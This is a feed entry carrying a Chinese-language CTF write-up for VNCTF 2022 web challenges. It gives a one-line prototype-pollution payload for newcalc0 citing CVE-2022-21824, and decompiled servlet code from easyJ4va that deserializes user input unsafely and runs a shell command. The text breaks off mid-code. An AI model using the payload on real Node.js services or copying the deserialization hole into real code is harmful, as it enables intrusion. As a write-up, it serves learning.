<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://blog.m1n.me</id>
    <title>M1N&#39;s Blog • Posts by &#34;writeup&#34; category</title>
    <link href="http://blog.m1n.me" />
    <updated>2022-02-13T13:03:05.000Z</updated>
    <entry>
        <id>http://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/</id>
        <title>VNCTF 2022 WriteUP</title>
        <link rel="alternate" href="http://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/"/>
        <content type="html">&lt;h1 id=&#34;vnctf-2022-writeup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vnctf-2022-writeup&#34;&gt;#&lt;/a&gt; VNCTF 2022 WriteUP&lt;/h1&gt;
&lt;h2 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h2&gt;
&lt;h3 id=&#34;gamev40&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gamev40&#34;&gt;#&lt;/a&gt; GameV4.0&lt;/h3&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105584.png&#34; alt=&#34;image-20220212161210388&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;BASE64 解密得 flag&lt;/p&gt;
&lt;h3 id=&#34;newcalc0&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#newcalc0&#34;&gt;#&lt;/a&gt; newcalc0&lt;/h3&gt;
&lt;p&gt;根据 CVE-2022-21824&lt;/p&gt;
&lt;p&gt;exp： &lt;code&gt;console.table([&amp;#123; x : 1 &amp;#125;], [ &amp;quot;__proto__&amp;quot; ]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105449.png&#34; alt=&#34;image-20220212182939249&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105778.png&#34; alt=&#34;image-20220212183005147&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;easyj4va&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easyj4va&#34;&gt;#&lt;/a&gt; easyJ4va&lt;/h3&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105785.png&#34; alt=&#34;image-20220212162237020&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;任意文件读取&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105124.png&#34; alt=&#34;image-20220212162325258&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;HelloWorldServlet.class&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; servlet;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; entity.User;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.util.Base64;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.util.Base64.Decoder;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.ServletException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.ServletOutputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.annotation.WebServlet;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.http.HttpServlet;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.http.HttpServletRequest;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.http.HttpServletResponse;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; util.Secr3t;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; util.SerAndDe;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@WebServlet(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;    name = &amp;quot;HelloServlet&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;    urlPatterns = &amp;#123;&amp;quot;/evi1&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;HelloWorldServlet&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;HttpServlet&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;volatile&lt;/span&gt; String name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;m4n_q1u_666&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;volatile&lt;/span&gt; String age = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;666&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;volatile&lt;/span&gt; String height = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;180&amp;quot;&lt;/span&gt;;&lt;br&gt;    User user;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;HelloWorldServlet&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; ServletException &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.user = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; User(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name, &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.age, &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height);&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;doGet&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HttpServletRequest req, HttpServletResponse resp)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; ServletException, IOException &lt;/span&gt;&amp;#123;&lt;br&gt;        String reqName = req.getParameter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (reqName != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name = reqName;&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Secr3t.check(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Response(resp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;no vnctf2022!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Secr3t.check(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name)) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Response(resp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;The Key is &amp;quot;&lt;/span&gt; + Secr3t.getKey());&lt;br&gt;            &amp;#125;&lt;br&gt;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;doPost&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HttpServletRequest req, HttpServletResponse resp)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; ServletException, IOException &lt;/span&gt;&amp;#123;&lt;br&gt;        String key = req.getParameter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;);&lt;br&gt;        String text = req.getParameter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;base64&amp;quot;&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Secr3t.getKey().equals(key) &amp;amp;&amp;amp; text != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;            Decoder decoder = Base64.getDecoder();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[] textByte = decoder.decode(text);&lt;br&gt;            User u = (User)SerAndDe.deserialize(textByte);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.user.equals(u)) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Response(resp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Deserialize…… Flag is &amp;quot;&lt;/span&gt; + Secr3t.getFlag().toString());&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Response(resp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;KeyError&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Response&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HttpServletResponse resp, String outStr)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;&amp;#123;&lt;br&gt;        ServletOutputStream out = resp.getOutputStream();&lt;br&gt;        out.write(outStr.getBytes());&lt;br&gt;        out.flush();&lt;br&gt;        out.close();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Secr3t.class&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Source code recreated from a .class file by IntelliJ IDEA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// (powered by FernFlower decompiler)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; util;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.BufferedReader;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.InputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.InputStreamReader;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.lang3.RandomStringUtils;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Secr3t&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String Key = RandomStringUtils.randomAlphanumeric(&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; StringBuffer Flag;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Secr3t&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; String &lt;span class=&#34;hljs-title&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Key;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; StringBuffer &lt;span class=&#34;hljs-title&#34;&gt;getFlag&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        Flag = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; StringBuffer();&lt;br&gt;        InputStream in = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;            in = Runtime.getRuntime().exec(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/readflag&amp;quot;&lt;/span&gt;).getInputStream();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException var12) &amp;#123;&lt;br&gt;            var12.printStackTrace();&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        BufferedReader read = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BufferedReader(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; InputStreamReader(in));&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;            String line = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;((line = read.readLine()) != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;                Flag.append(line + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException var13) &amp;#123;&lt;br&gt;            var13.printStackTrace();&lt;br&gt;        &amp;#125; &lt;span 